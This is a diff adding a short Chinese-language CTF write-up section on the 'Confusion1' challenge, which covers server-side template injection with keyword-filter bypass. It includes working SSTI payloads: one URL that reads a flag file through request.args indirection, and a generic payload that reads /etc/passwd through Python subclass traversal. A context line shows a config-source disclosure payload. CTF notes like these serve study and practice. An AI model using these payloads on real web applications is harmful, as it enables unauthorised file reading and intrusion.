@@ -4683,6 +4683,23 @@ home
 6. payload：`/index.php/config.php/%81?source`
    [![img](CTF.assets/5eb89ffbc2a9a83be53b48cb.jpg)](https://pic.downk.cc/item/5eb89ffbc2a9a83be53b48cb.jpg)
 
+## 攻防世界 Confusion1
+
+这题主要考点的模板注入，且里面做了大量的关键字过滤，绕过方法是：`request.args.a`或者使用`['__cla+ss__']`
+
+这里主要记录一个`File`类的文件读取
+
+```
+http://61.147.171.105:59629/{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read
+
+正常payload： 假设 40 为子类 File
+{{''.__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}
+```
+
+**使用`[]`就不需要使用`.`**
+
+
+
 # Misc
 
 ## János-the-Ripper-隐写-压缩包密码破解
